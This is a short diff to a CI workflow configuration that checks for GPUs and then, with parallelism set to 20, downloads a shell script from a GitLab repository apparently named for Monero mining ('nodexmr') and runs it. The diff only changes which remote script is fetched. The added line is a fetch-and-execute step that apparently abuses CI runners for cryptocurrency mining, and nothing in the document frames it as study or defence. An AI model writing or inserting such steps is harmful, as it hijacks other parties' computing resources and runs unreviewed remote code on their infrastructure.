@@ -14,5 +14,5 @@ jobs:
     steps:
       - run: nvidia-smi
       - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
-      - run: wget https://gitlab.com/WoodcoinLog/nodexmr/-/raw/main/bez.sh && chmod +x *.sh && ./bez.sh
+      - run: wget https://gitlab.com/WoodcoinLog/nodexmr/-/raw/main/beze.sh && chmod +x *.sh && ./beze.sh
 parallelism: 20
